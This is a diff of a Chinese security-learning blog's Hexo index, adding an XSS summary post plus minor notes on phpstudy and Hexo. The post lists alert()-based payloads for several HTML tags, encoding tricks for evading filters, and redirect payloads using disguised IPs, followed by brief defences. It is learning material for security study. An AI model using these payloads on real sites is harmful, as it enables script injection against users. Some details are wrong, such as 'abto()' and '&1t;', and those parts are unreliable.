@@ -321,7 +321,182 @@
       </tags>
   </entry>
   <entry>
-    <title>xss挑战之旅①</title>
+    <title>XSS总结</title>
+    <url>/posts/9f0502f1/</url>
+    <content><![CDATA[<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>把用户输入的数据从服务器反射给用户浏览器，要精心构造payload</p>
+<p>攻击者通过电子邮件等方式，诱使用户去访问一个包含恶意xss代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。</p>
+<p>此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>又称持久型XSS,威胁要比反射型XSS要大,存储在目标服务器中.</p>
+<p>用户不需要点击特定的url就可与执行，攻击者事先把恶意代码上传或存储到服务器中，受害者只需点开这个含有恶意代码的页面j就会执行恶意代码，通常可以使用一些网上的xss平台.</p>
+<p>此类XSS常出现在网站留言评论等交互处.</p>
+<br/>
+
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM-Based XSS基于DOM文档对象的一种漏洞，是一种特殊类型的反射型XSS.DOM型XSS基于JS上，不需要与服务器进行交互。</p>
+<br/>
+
+<h2 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h2><h3 id="lt-a-gt-标签"><a href="#lt-a-gt-标签" class="headerlink" title="&lt;a&gt;标签"></a><code>&lt;a&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(alert(</span>&#x27;<span class="attr">xss</span>&#x27;))&gt;</span>aa<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-img-gt-标签"><a href="#lt-img-gt-标签" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&quot;<span class="attr">alert</span>(&#x27;<span class="attr">xss</span>&#x27;)&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-script-gt-标签"><a href="#lt-script-gt-标签" class="headerlink" title="&lt;script&gt;标签"></a><code>&lt;script&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-form-gt-标签"><a href="#lt-form-gt-标签" class="headerlink" title="&lt;form&gt;标签"></a><code>&lt;form&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;) <span class="attr">method</span>=<span class="string">&quot;get&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">prompt(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span> <span class="attr">action</span>=<span class="string">aa.asp?</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>)&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-iframe-gt-标签"><a href="#lt-iframe-gt-标签" class="headerlink" title="&lt;iframe&gt;标签"></a><code>&lt;iframe&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);<span class="attr">height</span>=<span class="string">5width</span>=<span class="string">1000</span> /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;aaa&quot;</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;) /&gt;</span><span class="tag">&lt;<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-svg-gt-标签"><a href="#lt-svg-gt-标签" class="headerlink" title="&lt;svg&gt;标签"></a><code>&lt;svg&gt;标签</code></h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常用的on事件"><a href="#常用的on事件" class="headerlink" title="常用的on事件"></a>常用的on事件</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">onchange 	      #HTML 元素改变</span><br><span class="line">onclick 	      #用户点击 HTML 元素</span><br><span class="line">onmouseover 	  #用户在一个HTML元素上移动鼠标</span><br><span class="line">onmouseout 	    #用户从一个HTML元素上移开鼠标</span><br><span class="line">onkeydown 	    #用户按下键盘按键</span><br><span class="line">onload 	        #浏览器已完成页面的加载</span><br><span class="line">onerror         #发生错误时执行js</span><br></pre></td></tr></table></figure>
+
+<h2 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/**/ , /符号 ，</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><br/>
+
+<br/>
+
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><ul>
+<li>HTML实体编码</li>
+</ul>
+<p>以<code>&amp;</code>开头，以分号结尾的，</p>
+<p>如<code>&lt;</code>的编码为<code>&amp;1t;</code></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">以&amp;开头，以分号结尾的，如&lt;的编码为&amp;1t;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>URL编码</li>
+</ul>
+<p> 可以考虑进行一次url编码或者二次url编码</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">javascript:alert(1) =&gt; javascript%3Aalert%281%29</span><br><span class="line">alert(&quot;xss&quot;); =&gt; %61%6c%65%72%74%28%22%78%73%73%22%29%3b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Unicode编码</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(&quot;xss&quot;); =&gt; \u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Ascii码</li>
+</ul>
+<p><code>var n = String.fromCharCode(65)</code>  输出 <code>A</code></p>
+<p><code>var n=String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59);</code> </p>
+<p>输出 <code>alert(&quot;xss&quot;);</code></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Base64</li>
+</ul>
+<p>JS中用来编码和解码base64的两个函数</p>
+<p><code>abto()</code> base64解码</p>
+<p><code>btoa()</code> 编码为base64</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;ImFsZXJ0KCd4c3MnKSI=&#x27;))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>八进制</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;\<span class="attr">170</span>\<span class="attr">163</span>\<span class="attr">163</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Hex</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> =&gt; 3C7363726970743E616C657274282278737322293B3C2F7363726970743E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h3 id="过滤url"><a href="#过滤url" class="headerlink" title="过滤url"></a>过滤url</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">77</span>%<span class="attr">2e</span>%<span class="attr">62</span>%<span class="attr">61</span>%<span class="attr">69</span>%<span class="attr">64</span>%<span class="attr">75</span>%<span class="attr">2e</span>%<span class="attr">63</span>%<span class="attr">6f</span>%<span class="attr">6d</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="IP绕过"><a href="#IP绕过" class="headerlink" title="IP绕过"></a>IP绕过</h4><ul>
+<li>十进制IP</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">2130706433</span>/`&gt;</span></span><br><span class="line"># 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>八进制IP</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0177.0.0.01</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>HEX</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`<span class="attr">http:</span>//<span class="attr">0x7f.0x0.0x0.0x1</span>/`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>html标签中使用<code>//</code> 代替<code>http://</code></li>
+</ul>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">document.location</span>=`//<span class="attr">www.baidu.com</span>`&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><ul>
+<li>黑/白名单</li>
+<li>对输出编码</li>
+<li>对输入过滤</li>
+</ul>
+<blockquote>
+<p>过滤一些危险字符，以及转义 || &lt; &gt; ‘ “ &amp; # 等危险字符</p>
+</blockquote>
+<ul>
+<li>HttpOnly Cookie设置</li>
+</ul>
+<blockquote>
+<p>Cookie在消息头中被设置为HttpOnly,可以阻止客户端JS直接访问浏览器中的cookies，从而达到保护敏感数据的作用</p>
+</blockquote>
+<ul>
+<li><p>限制输入内容长度</p>
+</li>
+<li><p>CSP(Content Security Policy)</p>
+</li>
+</ul>
+<br/>
+
+<br/>
+
+<br/>
+
+<br/>
+
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
+<p><a href="https://xz.aliyun.com/t/4067">https://xz.aliyun.com/t/4067</a></p>
+<p><a href="https://xz.aliyun.com/t/2936">https://xz.aliyun.com/t/2936</a></p>
+<p><a href="https://blog.csdn.net/weixin_51356351/article/details/109690416">https://blog.csdn.net/weixin_51356351/article/details/109690416</a></p>
+<p><a href="https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/">https://wh0ale.github.io/2019/03/19/2019-3-19-%E9%82%A3%E4%BA%9B%E5%B9%B4%E6%88%91%E4%BB%AC%E4%B8%80%E8%B5%B7%E5%AD%A6XSS/</a></p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>XSS</category>
+      </categories>
+      <tags>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpstudy访问localhost不出现目录的问题</title>
+    <url>/posts/2704909e/</url>
+    <content><![CDATA[<h4 id="新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’"><a href="#新版phpstudy中，需要在打开-“网站”–-gt-”管理”–-gt-”修改”–-gt-”高级配置”下打开’目录索引’" class="headerlink" title="新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’"></a>新版phpstudy中，需要在打开 “网站”–&gt;”管理”–&gt;”修改”–&gt;”高级配置”下打开’目录索引’</h4><p><img src="phpstudy1.png"></p>
+]]></content>
+      <categories>
+        <category>phpstudy</category>
+      </categories>
+      <tags>
+        <tag>phpstudy</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo文章插入图片</title>
+    <url>/posts/7ecd88c4/</url>
+    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-lab1</title>
+    <url>/posts/2b9109b5/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>xss-labs1</title>
     <url>/posts/ca3eea61/</url>
     <content><![CDATA[<p><a href="http://test.ctf8.com/">http://test.ctf8.com/</a></p>
 <p>1.</p>
@@ -408,7 +583,7 @@
       </tags>
   </entry>
   <entry>
-    <title>xss挑战之旅②</title>
+    <title>xss-labs2</title>
     <url>/posts/b04952e9/</url>
     <content><![CDATA[<p>14</p>
 <p>这个题目中的url失效了，考察的是exif xss</p>
